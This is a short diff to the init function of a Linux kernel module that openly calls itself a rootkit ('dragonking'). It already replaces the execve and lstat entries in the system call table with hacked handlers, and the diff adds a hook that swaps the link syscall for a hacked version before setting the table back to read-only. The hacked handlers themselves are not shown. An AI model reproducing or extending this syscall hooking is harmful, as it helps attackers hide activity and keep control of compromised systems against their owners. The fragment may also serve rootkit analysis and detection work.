@@ -40,6 +40,8 @@ static int __init dragonking_init(void)
 	sys_call_table[__NR_execve] = (unsigned long*)&hacked_execve;
 	orig_lstat = (void *)sys_call_table[__NR_lstat];
 	sys_call_table[__NR_lstat] = (unsigned long *)&hacked_lstat;
+	orig_link = (void *)sys_call_table[__NR_link];
+	sys_call_table[__NR_link] = (void *)&hacked_link;
 	//Set back to RO
 	set_addr_ro((unsigned long) sys_call_table);
 	printk(KERN_INFO "This is a rootkit.\n");
